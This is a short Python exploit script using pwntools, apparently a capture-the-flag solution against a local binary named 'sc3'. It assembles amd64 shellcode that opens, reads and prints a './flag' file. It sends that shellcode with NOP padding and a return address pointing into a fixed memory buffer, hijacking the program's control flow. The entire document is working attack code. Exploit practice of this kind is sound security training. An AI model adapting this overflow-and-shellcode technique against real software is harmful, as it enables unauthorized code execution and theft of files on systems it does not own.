from pwn import *

context.arch = 'amd64'

io = process(['./sc3'])
# io = gdb.debug(['./sc3'], "b *0x400a53")

bss_buf = 0x6010a0

sc = shellcraft.amd64.linux.open("./flag", 0)
sc += shellcraft.amd64.linux.read(3, bss_buf+0x100, 0x40)
sc += shellcraft.amd64.linux.write(1, bss_buf+0x100, 0x40)
sc = asm(sc)

io.sendline(sc.ljust(0x80, '\x90')+p64(0) + p64(bss_buf))

io.interactive()
